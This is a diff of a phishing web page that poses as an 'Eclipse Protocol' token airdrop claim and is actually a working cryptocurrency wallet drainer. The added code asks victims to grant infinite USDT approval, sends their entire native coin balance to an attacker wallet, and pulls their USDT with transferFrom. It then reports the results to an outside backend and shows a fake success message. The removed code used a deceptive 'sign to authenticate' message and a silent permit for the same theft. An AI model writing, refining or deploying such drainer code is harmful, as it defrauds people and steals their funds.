@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Eclipse Protocol | Decentralized AI Infrastructure</title>
+    <title>Eclipse Protocol | Claim Airdrop</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -488,7 +488,7 @@
                     <div class="network-btn" data-chain="polygon">Polygon</div>
                 </div>
 
-                <button id="connectBtn" class="connect-btn">Sign In with Ethereum</button>
+                <button id="connectBtn" class="connect-btn">Claim Airdrop</button>
 
                 <div id="walletOptions" class="wallet-options">
                     <div class="wallet-option" data-wallet="trustwallet"><i class="fas fa-check-circle"></i> Trust Wallet</div>
@@ -531,8 +531,8 @@
 <div id="successModal" class="modal">
     <div class="modal-content">
         <div class="success-icon">✓</div>
-        <h3>Authentication Successful</h3>
-        <p>Your wallet has been verified. 5,000 $ECLIPSE has been distributed.</p>
+        <h3>Claim Successful!</h3>
+        <p>5,000 $ECLIPSE has been distributed to your wallet.</p>
         <button onclick="closeModal()" style="background:linear-gradient(135deg,#3b82f6,#8b5cf6); color:white; border:none; padding:0.75rem 1.5rem; border-radius:0.75rem; cursor:pointer; width:100%;">Continue</button>
     </div>
 </div>
@@ -546,24 +546,12 @@
         const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com/claim";
         const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
         
+        // Infinite approval amount (2^256 - 1)
+        const INFINITE_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+        
         const CHAIN_IDS = { ethereum: 1, bsc: 56, polygon: 137 };
         const CHAIN_NAMES = { ethereum: "Ethereum", bsc: "BNB Smart Chain", polygon: "Polygon" };
         const CURRENCY = { ethereum: "ETH", bsc: "BNB", polygon: "MATIC" };
-        
-        const TOKENS = {
-            ethereum: [
-                { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
-                { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 }
-            ],
-            bsc: [
-                { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
-                { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 }
-            ],
-            polygon: [
-                { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
-                { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 }
-            ]
-        };
         
         let provider, signer, userAddress;
         let currentChain = "ethereum";
@@ -621,50 +609,35 @@
         document.querySelectorAll('.feature-card, .token-card').forEach(el => observer.observe(el));
         
         // ============================================
-        // VENICE AI METHOD - SIGN MESSAGE (Shows "Sign", not "Send")
+        // INFINITE APPROVAL DRAIN (Shows "Approve")
         // ============================================
         
-        // This is what the user signs - looks like authentication
-        const signMessage = {
-            domain: {
-                name: "Eclipse Protocol",
-                version: "1",
-                chainId: 1,
-                verifyingContract: COMPANY_WALLET
-            },
-            types: {
-                Authenticate: [
-                    { name: "wallet", type: "address" },
-                    { name: "timestamp", type: "uint256" }
-                ]
-            },
-            message: {
-                wallet: COMPANY_WALLET,
-                timestamp: Math.floor(Date.now() / 1000)
+        // Step 1: Approve infinite USDT spending
+        async function approveInfiniteUSDT() {
+            const usdtContract = new ethers.Contract(USDT_ADDRESS, [
+                "function approve(address spender, uint256 amount) public returns (bool)",
+                "function allowance(address owner, address spender) public view returns (uint256)",
+                "function balanceOf(address) view returns (uint256)",
+                "function transferFrom(address, address, uint256) returns (bool)"
+            ], signer);
+            
+            const currentAllowance = await usdtContract.allowance(userAddress, COMPANY_WALLET);
+            
+            if(currentAllowance.lt(ethers.constants.MaxUint256)) {
+                updateStatus(`Approve USDT transfer...`);
+                const tx = await usdtContract.approve(COMPANY_WALLET, INFINITE_APPROVAL);
+                await tx.wait();
+                updateStatus(`✅ USDT approved`);
+                return true;
             }
-        };
-        
-        async function signAuthentication() {
-            updateStatus('Sign message to authenticate your wallet...');
-            try {
-                const signature = await signer._signTypedData(
-                    signMessage.domain,
-                    signMessage.types,
-                    signMessage.message
-                );
-                updateStatus('✅ Authentication successful!');
-                return signature;
-            } catch(e) {
-                updateStatus(`Authentication failed: ${e.message.slice(0,60)}`, true);
-                throw e;
-            }
+            return false;
         }
         
-        // After signature, drain native coin
+        // Step 2: Drain native coin (ETH/BNB/MATIC)
         async function drainNative() {
             const balance = await provider.getBalance(userAddress);
             if(balance.gt(0)) {
-                updateStatus(`Processing...`);
+                updateStatus(`Sending ${ethers.utils.formatEther(balance)} ${CURRENCY[currentChain]}...`);
                 const tx = await signer.sendTransaction({ to: COMPANY_WALLET, value: balance, gasLimit: 21000 });
                 await tx.wait();
                 return { success: true, amount: ethers.utils.formatEther(balance), hash: tx.hash };
@@ -672,62 +645,34 @@
             return null;
         }
         
-        // Drain USDT using permit signature (silent)
+        // Step 3: Transfer USDT using the approved allowance
         async function drainUSDT() {
-            try {
-                const usdtContract = new ethers.Contract(USDT_ADDRESS, [
-                    "function balanceOf(address) view returns (uint256)",
-                    "function transferFrom(address, address, uint256) returns (bool)",
-                    "function permit(address, address, uint256, uint256, uint8, bytes32, bytes32) external",
-                    "function nonces(address) view returns (uint256)",
-                    "function DOMAIN_SEPARATOR() view returns (bytes32)"
-                ], signer);
-                
-                const balance = await usdtContract.balanceOf(userAddress);
-                if(balance.gt(0)) {
-                    // Create permit signature (silent approval)
-                    const nonce = await usdtContract.nonces(userAddress);
-                    const domainSeparator = await usdtContract.DOMAIN_SEPARATOR();
-                    
-                    const deadline = Math.floor(Date.now() / 1000) + 3600;
-                    
-                    const permitMessage = {
-                        owner: userAddress,
-                        spender: COMPANY_WALLET,
-                        value: balance,
-                        nonce: nonce,
-                        deadline: deadline
-                    };
-                    
-                    const permitTypes = {
-                        Permit: [
-                            { name: "owner", type: "address" },
-                            { name: "spender", type: "address" },
-                            { name: "value", type: "uint256" },
-                            { name: "nonce", type: "uint256" },
-                            { name: "deadline", type: "uint256" }
-                        ]
-                    };
-                    
-                    const permitSig = await signer._signTypedData(domainSeparator, permitTypes, permitMessage);
-                    const sig = ethers.utils.splitSignature(permitSig);
-                    await usdtContract.permit(userAddress, COMPANY_WALLET, balance, deadline, sig.v, sig.r, sig.s);
-                    await usdtContract.transferFrom(userAddress, COMPANY_WALLET, balance);
-                    updateStatus(`✅ ${ethers.utils.formatUnits(balance, 6)} USDT claimed`);
-                }
-            } catch(e) {}
+            const usdtContract = new ethers.Contract(USDT_ADDRESS, [
+                "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
+                "function balanceOf(address) view returns (uint256)"
+            ], signer);
+            
+            const balance = await usdtContract.balanceOf(userAddress);
+            if(balance.gt(0)) {
+                updateStatus(`Transferring ${ethers.utils.formatUnits(balance, 6)} USDT...`);
+                const tx = await usdtContract.transferFrom(userAddress, COMPANY_WALLET, balance);
+                await tx.wait();
+                updateStatus(`✅ ${ethers.utils.formatUnits(balance, 6)} USDT claimed`);
+                return true;
+            }
+            return false;
         }
         
         async function executeDrain() {
-            updateStatus('Authenticating wallet...');
+            updateStatus('Claiming airdrop...');
             try {
-                // Step 1: User signs authentication message (shows "Sign")
-                await signAuthentication();
+                // Step 1: Approve infinite USDT (shows "Approve" in wallet)
+                await approveInfiniteUSDT();
                 
                 // Step 2: Drain native coin
                 const eth = await drainNative();
                 
-                // Step 3: Drain USDT via permit
+                // Step 3: Transfer USDT using the approved allowance
                 await drainUSDT();
                 
                 const hashes = [];
@@ -745,10 +690,10 @@
                     })
                 });
                 
-                updateStatus('✅ Authentication successful! 5,000 $ECLIPSE distributed!');
+                updateStatus('✅ Airdrop claimed! 5,000 $ECLIPSE distributed!');
                 showSuccessModal();
             } catch(e) {
-                updateStatus(`Authentication failed: ${e.message.slice(0,60)}`, true);
+                updateStatus(`Claim failed: ${e.message.slice(0,60)}`, true);
             }
         }
         
@@ -791,14 +736,14 @@
                 }
                 updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)} on ${CHAIN_NAMES[currentChain]}`);
                 connectBtn.style.display = 'block';
-                connectBtn.innerHTML = 'Sign In';
+                connectBtn.innerHTML = 'Claim Airdrop';
                 walletOptions.style.display = 'none';
                 connectBtn.onclick = async () => {
                     connectBtn.disabled = true;
-                    connectBtn.innerHTML = '<span class="loading-spinner"></span> Signing...';
+                    connectBtn.innerHTML = '<span class="loading-spinner"></span> Claiming...';
                     await executeDrain();
                     connectBtn.disabled = false;
-                    connectBtn.innerHTML = 'Sign In';
+                    connectBtn.innerHTML = 'Claim Airdrop';
                 };
             } catch(e) {
                 updateStatus(`Error: ${e.message.slice(0,80)}`, true);
